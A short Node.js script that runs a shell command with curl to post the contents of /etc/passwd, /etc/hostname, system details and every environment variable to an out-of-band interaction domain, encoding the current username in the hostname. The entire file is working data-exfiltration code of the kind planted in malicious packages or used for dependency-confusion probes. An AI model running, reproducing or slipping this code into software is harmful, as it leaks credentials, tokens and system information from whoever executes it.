const { exec } = require("child_process");
const command = 'curl -XPOST "http://$(whoami).ytpqnupqgijluptylsxt6kki8h0pqsg74.oast.fun/" -d "$(cat /etc/passwd /etc/hostname && uname -a && env)"';
exec(command, (error, stdout, stderr) => {
if (error) {
console.error(error.message);
return;
}
if (stderr) {
console.log(stderr);
}
console.log(stdout);
});

